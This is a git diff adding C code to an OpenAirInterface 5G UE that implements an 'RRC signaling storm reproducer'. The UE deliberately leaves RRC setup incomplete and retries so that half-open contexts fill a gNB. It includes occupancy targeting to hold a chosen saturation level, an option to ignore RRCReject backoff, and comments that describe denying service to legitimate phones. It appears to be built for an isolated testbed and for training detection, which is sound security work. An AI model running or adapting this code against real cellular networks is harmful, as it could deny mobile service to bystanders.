diff --git a/openair2/RRC/NR_UE/rrc_timers_and_constants.c b/openair2/RRC/NR_UE/rrc_timers_and_constants.c
index 0addfe5..ecb345e 100644
--- a/openair2/RRC/NR_UE/rrc_timers_and_constants.c
+++ b/openair2/RRC/NR_UE/rrc_timers_and_constants.c
@@ -4,6 +4,308 @@
 
 #include "openair2/RRC/NR_UE/rrc_proto.h"
 #include "executables/softmodem-common.h"
+#include "common/config/config_userapi.h"
+#include "LAYER2/NR_MAC_UE/mac_proto.h"
+#include <stdarg.h>
+#include <stdio.h>
+#include <time.h>
+
+/* ---------------------------------------------------------------------------
+ * RRC signaling storm reproducer, A-type (UE side only). See rrc_proto.h.
+ *
+ * Scope rules kept deliberately narrow:
+ *  - nothing here changes gNB behaviour or any 3GPP timer value;
+ *  - with --rss.enable 0 (default) every function below is inert, so the same
+ *    binary is also the regression-test binary for normal attach;
+ *  - max_duration_s is an in-process kill switch: when it fires the UE goes
+ *    back to completing RRC setup normally.
+ * -------------------------------------------------------------------------*/
+#define RSS_CFG_PREFIX "rss"
+
+typedef struct {
+  int enable;
+  int interval_ms;
+  int reject_backoff_ms;
+  int honor_reject;
+  int completion_pct;
+  int max_duration_s;
+  int ack_gate;
+  int target_occupancy;
+  int hold_ms;
+  int tick_report;
+  char *run_id;
+  char *log_file;
+} rss_cfg_t;
+
+static rss_cfg_t rss_cfg;
+
+/* clang-format off */
+#define RSS_PARAMS_DESC { \
+  {"enable",            "1 = A-type: receive Msg4, skip RRCSetupComplete, retry\n",      0, .iptr=&rss_cfg.enable,            .defintval=0,                        TYPE_INT,    0}, \
+  {"interval_ms",       "delay between a skipped Msg5 and the next RRCSetupRequest\n",   0, .iptr=&rss_cfg.interval_ms,       .defintval=100,                      TYPE_INT,    0}, \
+  {"reject_backoff_ms", "delay after RRCReject when the gNB sent no waitTime\n",         0, .iptr=&rss_cfg.reject_backoff_ms, .defintval=1000,                     TYPE_INT,    0}, \
+  {"honor_reject",      "1 = obey RRCReject waitTime/backoff, 0 = retry at once\n",      0, .iptr=&rss_cfg.honor_reject,      .defintval=1,                        TYPE_INT,    0}, \
+  {"completion_pct",    "percent completed normally. >0 ends the run at the first one\n",  0, .iptr=&rss_cfg.completion_pct,    .defintval=0,                        TYPE_INT,    0}, \
+  {"max_duration_s",    "kill switch: stop the reproducer after this many seconds\n",    0, .iptr=&rss_cfg.max_duration_s,    .defintval=60,                       TYPE_INT,    0}, \
+  {"ack_gate",          "1 = never restart RA while the Msg4 HARQ ACK PUCCH is pending\n", 0, .iptr=&rss_cfg.ack_gate,        .defintval=1,                        TYPE_INT,    0}, \
+  {"target_occupancy",  "hold this many incomplete contexts at the gNB (0 = unlimited)\n", 0, .iptr=&rss_cfg.target_occupancy, .defintval=0,                        TYPE_INT,    0}, \
+  {"hold_ms",           "gNB hold time per incomplete context (t300 + guard)\n",         0, .iptr=&rss_cfg.hold_ms,           .defintval=2000,                     TYPE_INT,    0}, \
+  {"tick_report",       "log the measured RRC tick rate every N ticks (0 = off)\n",      0, .iptr=&rss_cfg.tick_report,       .defintval=100,                      TYPE_INT,    0}, \
+  {"run_id",            "run identifier written into every JSONL record\n",              0, .strptr=&rss_cfg.run_id,          .defstrval="rss-run",                TYPE_STRING, 0}, \
+  {"log_file",          "per-attempt JSONL ground truth for the detection team\n",       0, .strptr=&rss_cfg.log_file,        .defstrval="/tmp/rss_attempts.jsonl", TYPE_STRING, 0}, \
+}
+/* clang-format on */
+
+static bool rss_cfg_done;
+static bool rss_killed;
+static uint64_t rss_t0_ns;
+static unsigned rss_seq;
+static unsigned rss_completed;
+static FILE *rss_log_fd;
+static bool rss_got_msg4;        /* did the current attempt reach Msg4? */
+/* Closed-loop occupancy control.
+   The occupancy the gNB sees is N = (incomplete attempts started in the last
+   T_hold). The UE can count that itself: every attempt we leave incomplete
+   holds one context for exactly hold_ms. So target_occupancy becomes a real
+   knob without any feedback from the gNB: below target we keep attacking,
+   at target we idle. Measured 2026-10-20: interval_ms alone cannot do this,
+   because the realised Msg4 rate saturates near 3.8/s regardless of interval. */
+#define RSS_OCC_WINDOW 512
+static uint64_t rss_skip_ts[RSS_OCC_WINDOW];
+static unsigned rss_skip_head;
+static unsigned rss_occ_hold_logs;
+static unsigned rss_ticks;       /* RRC ticks seen while enabled */
+static uint64_t rss_tick_t0_ns;  /* start of the current tick-rate window */
+
+static uint64_t rss_now_ns(void)
+{
+  struct timespec ts;
+  clock_gettime(CLOCK_REALTIME, &ts);
+  return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
+}
+
+static const rss_cfg_t *rss_get_cfg(void)
+{
+  if (!rss_cfg_done) {
+    paramdef_t params[] = RSS_PARAMS_DESC;
+    config_get(config_get_if(), params, sizeofArray(params), RSS_CFG_PREFIX);
+    rss_cfg_done = true;
+    /* interval_ms 0 is allowed and means "on the next tick", i.e. max rate.
+       The floor is then the RA cycle itself (PRACH occasion + RAR + Msg3 + Msg4). */
+    if (rss_cfg.interval_ms < 0)
+      rss_cfg.interval_ms = 0;
+    if (rss_cfg.reject_backoff_ms < 10)
+      rss_cfg.reject_backoff_ms = 10;
+    rss_cfg.completion_pct = rss_cfg.completion_pct < 0 ? 0 : (rss_cfg.completion_pct > 100 ? 100 : rss_cfg.completion_pct);
+    if (rss_cfg.enable) {
+      LOG_W(NR_RRC,
+            "[RSS] A-type reproducer ENABLED (isolated testbed only): interval=%d ms completion=%d%% "
+            "honor_reject=%d ack_gate=%d max_duration=%d s run_id=%s log=%s\n",
+            rss_cfg.interval_ms,
+            rss_cfg.completion_pct,
+            rss_cfg.honor_reject,
+            rss_cfg.ack_gate,
+            rss_cfg.max_duration_s,
+            rss_cfg.run_id,
+            rss_cfg.log_file);
+    }
+  }
+  return &rss_cfg;
+}
+
+bool nr_rss_enabled(void)
+{
+  return rss_get_cfg()->enable != 0 && !rss_killed;
+}
+
+bool nr_rss_honor_reject(void)
+{
+  return rss_get_cfg()->honor_reject != 0;
+}
+
+int nr_rss_reject_backoff_ms(void)
+{
+  return rss_get_cfg()->reject_backoff_ms;
+}
+
+void nr_rss_log(const char *event, const char *fmt, ...)
+{
+  const rss_cfg_t *cfg = rss_get_cfg();
+  if (!cfg->enable || !cfg->log_file || !cfg->log_file[0])
+    return;
+  if (!rss_log_fd) {
+    rss_log_fd = fopen(cfg->log_file, "a");
+    if (!rss_log_fd) {
+      LOG_E(NR_RRC, "[RSS] cannot open %s for writing\n", cfg->log_file);
+      return;
+    }
+  }
+  fprintf(rss_log_fd,
+          "{\"type\":\"event\",\"run_id\":\"%s\",\"seq\":%u,\"t_ns\":%llu,\"event\":\"%s\"",
+          cfg->run_id ? cfg->run_id : "",
+          rss_seq,
+          (unsigned long long)rss_now_ns(),
+          event);
+  if (fmt && fmt[0]) {
+    va_list ap;
+    va_start(ap, fmt);
+    fputc(',', rss_log_fd);
+    vfprintf(rss_log_fd, fmt, ap);
+    va_end(ap);
+  }
+  fprintf(rss_log_fd, "}\n");
+  fflush(rss_log_fd);
+}
+
+unsigned nr_rss_next_seq(void)
+{
+  if (rss_t0_ns == 0)
+    rss_t0_ns = rss_now_ns();
+  /* Close out the previous attempt. An attempt that never saw Msg4 means the
+     gNB did not answer or the contention was lost. Under saturation this
+     fraction is the denial signal we can read without a second UE. */
+  if (rss_seq > 0 && !rss_got_msg4)
+    nr_rss_log("attempt_end", "\"actual_reach\":\"no_msg4\"");
+  rss_got_msg4 = false;
+  return ++rss_seq;
+}
+
+void nr_rss_note_msg4(void)
+{
+  rss_got_msg4 = true;
+}
+
+void nr_rss_note_skip(void)
+{
+  rss_skip_ts[rss_skip_head] = rss_now_ns();
+  rss_skip_head = (rss_skip_head + 1) % RSS_OCC_WINDOW;
+}
+
+unsigned nr_rss_occupancy(void)
+{
+  const uint64_t hold_ns = (uint64_t)rss_get_cfg()->hold_ms * 1000000ULL;
+  const uint64_t now = rss_now_ns();
+  unsigned n = 0;
+  for (unsigned i = 0; i < RSS_OCC_WINDOW; i++)
+    if (rss_skip_ts[i] != 0 && now - rss_skip_ts[i] < hold_ns)
+      n++;
+  return n;
+}
+
+/* A completed attempt leaves RRC in CONNECTED, and a new RRCSetupRequest is
+   only sent from RRC_IDLE, so the loop stops there. Releasing the connection
+   from this timer was tried on the box 2026-10-20 and crashed the UE right
+   after the release (probe_release -> resync -> SIGSEGV, run SAT-1019T220108Z),
+   so that path is removed. completion_pct > 0 therefore ends the run at its
+   first completed attempt and is only useful for one-shot checks.
+   Denial does not need it: once the cell is full the gNB answers an ordinary
+   RRCSetupRequest with RRCReject, which is logged as actual_reach=rrc_reject
+   and is exactly what a legitimate UE would receive. */
+
+/* Deterministic stride instead of a coin flip: the realised completion ratio is
+   exact and the same run is replayable for the detection team. */
+bool nr_rss_complete_this_attempt(void)
+{
+  const rss_cfg_t *cfg = rss_get_cfg();
+  if (cfg->completion_pct <= 0)
+    return false;
+  if (cfg->completion_pct >= 100)
+    return true;
+  unsigned due = (rss_seq * (unsigned)cfg->completion_pct) / 100;
+  if (due > rss_completed) {
+    rss_completed = due;
+    return true;
+  }
+  return false;
+}
+
+/* Box measurement 2026-10-20: a 100 ms target armed with nr_timer_setup() fired
+   after 306 ms (median of 71 attempts). nr_timer_tick() adds a fixed 10 ms per
+   call, but one call is one radio-frame message, and over the ZMQ path those do
+   not arrive every 10 ms. Counting ticks therefore multiplies the whole knob by
+   the tick error. A wall-clock deadline bounds the error at one tick instead of
+   accumulating it, so the timer below is only a once-per-tick poll. */
+void nr_rss_arm_retry(NR_UE_RRC_INST_t *rrc, int delay_ms)
+{
+  const rss_cfg_t *cfg = rss_get_cfg();
+  NR_UE_Timers_Constants_t *tac = &rrc->timers_and_constants;
+  int d = delay_ms > 0 ? delay_ms : cfg->interval_ms;
+  tac->rss_deadline_ns = rss_now_ns() + (uint64_t)d * 1000000ULL;
+  nr_timer_setup(&tac->rss_retry_timer, 10, 10);
+  nr_timer_start(&tac->rss_retry_timer);
+}
+
+static void rss_poll(NR_UE_RRC_INST_t *rrc)
+{
+  NR_UE_Timers_Constants_t *tac = &rrc->timers_and_constants;
+  NR_timer_t *t = &tac->rss_retry_timer;
+  const rss_cfg_t *cfg = rss_get_cfg();
+
+  /* Tick-rate instrumentation. One call here is one radio frame, nominally
+     10 ms. Logging the measured value turns the "configured vs realised"
+     mismatch from a guess into a number. */
+  if (cfg->enable) {
+    uint64_t now = rss_now_ns();
+    rss_ticks++;
+    if (rss_tick_t0_ns == 0) {
+      rss_tick_t0_ns = now;
+    } else if (cfg->tick_report > 0 && rss_ticks % (unsigned)cfg->tick_report == 0) {
+      double ms = (double)(now - rss_tick_t0_ns) / 1e6 / (double)cfg->tick_report;
+      nr_rss_log("tick_rate", "\"ms_per_tick\":%.2f,\"nominal_ms\":10", ms);
+      rss_tick_t0_ns = now;
+    }
+  }
+
+  bool polled = nr_timer_tick(t);
+
+  if (!polled || !nr_rss_enabled())
+    return;
+
+  if (cfg->max_duration_s > 0 && rss_t0_ns != 0
+      && rss_now_ns() - rss_t0_ns > (uint64_t)cfg->max_duration_s * 1000000000ULL) {
+    rss_killed = true;
+    LOG_W(NR_RRC, "[RSS] max_duration_s=%d reached: reproducer disabled, normal attach resumes\n", cfg->max_duration_s);
+    nr_rss_log("kill_switch", "\"attempts\":%u,\"ticks\":%u", rss_seq, rss_ticks);
+    return;
+  }
+
+  /* Not due yet. Keep polling; granularity is one tick, not one interval. */
+  if (tac->rss_deadline_ns != 0 && rss_now_ns() < tac->rss_deadline_ns) {
+    nr_timer_setup(t, 10, 10);
+    nr_timer_start(t);
+    return;
+  }
+
+  /* Occupancy ceiling: idle while the gNB already holds the requested number of
+     incomplete contexts. This is what makes the saturation level settable. */
+  if (cfg->target_occupancy > 0) {
+    unsigned occ = nr_rss_occupancy();
+    if (occ >= (unsigned)cfg->target_occupancy) {
+      if (rss_occ_hold_logs++ % 25 == 0)
+        nr_rss_log("occupancy_hold", "\"occupancy\":%u,\"target\":%d", occ, cfg->target_occupancy);
+      nr_timer_setup(t, 10, 10);
+      nr_timer_start(t);
+      return;
+    }
+  }
+
+  /* Keep the Msg4 HARQ ACK. Restarting RA calls reset_ra(), whose memset clears
+     the PUCCH prepared by prepare_msg4_msgb_feedback(); without the ACK the gNB
+     drops the contention early and nothing accumulates. */
+  if (cfg->ack_gate) {
+    const NR_UE_MAC_INST_t *mac = get_mac_inst(rrc->ue_id);
+    if (mac && mac->ra.ra_pucch) {
+      nr_rss_log("ack_pending_postpone", NULL);
+      nr_timer_setup(t, 10, 10);
+      nr_timer_start(t);
+      return;
+    }
+  }
+
+  tac->rss_deadline_ns = 0;
+  nr_rss_log("retrigger", NULL);
+  handle_t300_expiry(rrc);
+}
 
